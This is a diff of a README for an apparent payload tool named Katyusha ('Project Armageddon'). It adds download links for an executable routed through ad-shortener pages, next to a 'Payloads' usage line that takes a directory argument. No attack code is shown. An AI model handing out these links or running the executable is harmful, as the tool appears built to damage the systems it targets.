@@ -48,6 +48,12 @@ It is proclaimed as a Multiple Rocket Launcher System, nicknamed by the Germans 
 
 Though it is Very Inaccurate for precise targets or even missing them, Katyusha's are easily deployable and be relocated with ease, easy to produce, and would be hell if their are multiple Katyusha's are used, due to poor precision the Katyusha is not able to penetrate covered areas, and can only hit exposed unit(s) / Infastructure only by chance, and can sometiems be easily be detectable.
 
+### Download 🔻:
+Why is it [adfoc.us](http://adfoc.us/70081799483219)? This is so we can continue Developing Katyusha and Project Armageddon, Don't worry It's way Better than Linkvertise!
+#### Confused? Press the Skip Button in the Upper Right Corner (It is almost blended into the Background)
+
+- [v9.12.2023.0](http://adfoc.us/70081782434898)
+
 ### Payloads 🚀:
 		<< Katyusha >> 
     Usage: Katyusha.exe [directory] [mode] [options]
